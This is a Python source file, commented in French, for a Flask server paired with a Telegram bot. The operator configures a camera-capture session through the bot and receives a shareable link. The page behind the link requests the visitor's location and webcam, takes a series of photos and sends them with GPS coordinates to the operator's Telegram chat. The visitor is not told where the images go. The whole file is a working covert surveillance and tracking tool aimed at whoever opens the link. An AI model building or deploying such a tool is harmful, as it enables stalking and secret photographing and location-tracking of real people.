import os
import base64
import re
import threading
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, abort, render_template_string
from telegram import Bot
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, ConversationHandler, CallbackContext
from telegram import Update, ReplyKeyboardMarkup
import uuid

from dotenv import load_dotenv
import os

load_dotenv()  # charge automatiquement les variables du fichier .env

BOT_TOKEN = os.getenv('BOT_TOKEN')
CHAT_ID = os.getenv('CHAT_ID')
SERVER_URL = os.getenv('SERVER_URL')

PORT = int(os.environ.get('PORT', 8080))

app = Flask(__name__)
bot = Bot(token=BOT_TOKEN)

CAPTURE_DIR = 'captures'
os.makedirs(CAPTURE_DIR, exist_ok=True)

# --- Gestion sessions captures ---
sessions = {}  # token: {camera, num_photos, interval, expire_at}

def cleanup_sessions():
    # Nettoyer sessions expirées toutes les 60s
    while True:
        now = datetime.utcnow()
        expired = [k for k,v in sessions.items() if v['expire_at'] < now]
        for k in expired:
            print(f"Session {k} expirée")
            del sessions[k]
        import time
        time.sleep(60)

threading.Thread(target=cleanup_sessions, daemon=True).start()

# --- Bot Telegram conversation ---

CAMERA, NUM_PHOTOS, INTERVAL, DURATION = range(4)

def start(update: Update, context: CallbackContext):
    reply_keyboard = [['user', 'environment']]
    update.message.reply_text(
        "Choisis la caméra (user=avant, environment=arrière) :",
        reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True))
    return CAMERA

def camera_choice(update: Update, context: CallbackContext):
    cam = update.message.text
    if cam not in ['user', 'environment']:
        update.message.reply_text("Choix invalide, choisis 'user' ou 'environment'.")
        return CAMERA
    context.user_data['camera'] = cam
    update.message.reply_text("Combien de photos prendre ? (ex: 3)")
    return NUM_PHOTOS

def num_photos_choice(update: Update, context: CallbackContext):
    try:
        n = int(update.message.text)
        if n <= 0 or n > 20:
            update.message.reply_text("Merci d'indiquer un nombre entre 1 et 20.")
            return NUM_PHOTOS
        context.user_data['num_photos'] = n
        update.message.reply_text("Intervalle entre photos (secondes) ? (ex: 2)")
        return INTERVAL
    except:
        update.message.reply_text("Merci d'indiquer un nombre entier.")
        return NUM_PHOTOS

def interval_choice(update: Update, context: CallbackContext):
    try:
        interval = int(update.message.text)
        if interval <= 0 or interval > 60:
            update.message.reply_text("Merci d'indiquer un intervalle entre 1 et 60 secondes.")
            return INTERVAL
        context.user_data['interval'] = interval
        update.message.reply_text("Durée de validité du lien (minutes) ? (ex: 10)")
        return DURATION
    except:
        update.message.reply_text("Merci d'indiquer un nombre entier.")
        return INTERVAL

def duration_choice(update: Update, context: CallbackContext):
    try:
        duration = int(update.message.text)
        if duration <= 0 or duration > 120:
            update.message.reply_text("Merci d'indiquer une durée entre 1 et 120 minutes.")
            return DURATION
        context.user_data['duration'] = duration

        # Générer token unique
        token = str(uuid.uuid4())
        expire_at = datetime.utcnow() + timedelta(minutes=duration)
        sessions[token] = {
            'camera': context.user_data['camera'],
            'num_photos': context.user_data['num_photos'],
            'interval': context.user_data['interval'],
            'expire_at': expire_at
        }

        url = f"{get_server_url()}/capture/{token}"
        update.message.reply_text(f"Voici le lien de capture (valide {duration} minutes):\n{url}")

        return ConversationHandler.END
    except Exception as e:
        update.message.reply_text("Merci d'indiquer un nombre entier.")
        return DURATION

def cancel(update: Update, context: CallbackContext):
    update.message.reply_text("Annulé.")
    return ConversationHandler.END

def get_server_url():
    # Renvoie l'URL publique de ton serveur
    # Soit fixe, soit tu peux récupérer dynamiquement
    # Ici, on suppose tu fixes une variable d'environnement ou config
    return os.environ.get('SERVER_URL', 'https://tonserveur.example.com')

def start_bot():
    from telegram.ext import Updater
    updater = Updater(BOT_TOKEN)
    dp = updater.dispatcher

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('startcapture', start)],
        states={
            CAMERA: [MessageHandler(Filters.text & ~Filters.command, camera_choice)],
            NUM_PHOTOS: [MessageHandler(Filters.text & ~Filters.command, num_photos_choice)],
            INTERVAL: [MessageHandler(Filters.text & ~Filters.command, interval_choice)],
            DURATION: [MessageHandler(Filters.text & ~Filters.command, duration_choice)],
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    dp.add_handler(conv_handler)
    updater.start_polling()
    print("Bot Telegram démarré")
    return updater

# --- Flask routes ---

CAPTURE_HTML = '''
<!DOCTYPE html>
<html>
<head><title>Capture webcam + géoloc</title></head>
<body style="background:#121212;color:#eee;font-family:sans-serif;text-align:center;">
<h2>Capture webcam + géoloc</h2>
<p>Caméra : <b>{{ camera }}</b></p>
<p>Photos à prendre : <b>{{ num_photos }}</b></p>
<p>Intervalle (sec) : <b>{{ interval }}</b></p>

<p id="status">Demande accès géoloc + webcam...</p>

<script>
const camera = "{{ camera }}";
const numPhotos = parseInt("{{ num_photos }}");
const interval = parseInt("{{ interval }}");
let count = 0;

async function startCapture() {
    if (!navigator.geolocation) {
        alert('Géolocalisation non supportée');
        return;
    }
    navigator.geolocation.getCurrentPosition(async (pos) => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camera } });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');

            async function takePhoto() {
                if (count >= numPhotos) {
                    document.getElementById('status').innerText = "Terminé, merci !";
                    stream.getTracks().forEach(track => track.stop());
                    return;
                }
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/png');
                document.getElementById('status').innerText = `Envoi photo ${count + 1} / ${numPhotos}...`;
                await fetch('/report/{{ token }}', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({latitude: lat, longitude: lon, image: imageData})
                });
                count++;
                setTimeout(takePhoto, interval * 1000);
            }
            takePhoto();
        } catch(e) {
            alert('Erreur caméra: ' + e.message);
            document.getElementById('status').innerText = "Erreur caméra";
        }
    }, () => alert('Géoloc refusée'));
}
startCapture();
</script>
</body>
</html>
'''

@app.route('/capture/<token>')
def capture(token):
    sess = sessions.get(token)
    if not sess:
        abort(404, "Lien invalide ou expiré")
    if sess['expire_at'] < datetime.utcnow():
        del sessions[token]
        abort(410, "Lien expiré")
    return render_template_string(CAPTURE_HTML,
                                  camera=sess['camera'],
                                  num_photos=sess['num_photos'],
                                  interval=sess['interval'],
                                  token=token)

@app.route('/report/<token>', methods=['POST'])
def report(token):
    sess = sessions.get(token)
    if not sess or sess['expire_at'] < datetime.utcnow():
        abort(404)
    data = request.get_json()
    lat = data.get('latitude')
    lon = data.get('longitude')
    img_data = data.get('image')

    msg = f"Nouvelle capture (session {token}):\nLatitude: {lat}\nLongitude: {lon}"
    bot.send_message(chat_id=CHAT_ID, text=msg)

    img_str = re.sub('^data:image/.+;base64,', '', img_data)
    img_bytes = base64.b64decode(img_str)

    filename = datetime.utcnow().strftime(f'capture_{token}_%Y%m%d_%H%M%S_%f.png')
    filepath = os.path.join(CAPTURE_DIR, filename)
    with open(filepath, 'wb') as f:
        f.write(img_bytes)

    with open(filepath, 'rb') as photo_file:
        bot.send_photo(chat_id=CHAT_ID, photo=photo_file)

    return jsonify({'status': 'ok'})

if __name__ == '__main__':
    # Démarre le bot Telegram en thread séparé
    updater = start_bot()
    # Lance Flask (avec threaded=True pour pouvoir gérer plusieurs connexions)
    app.run(host='0.0.0.0', port=PORT, threaded=True)
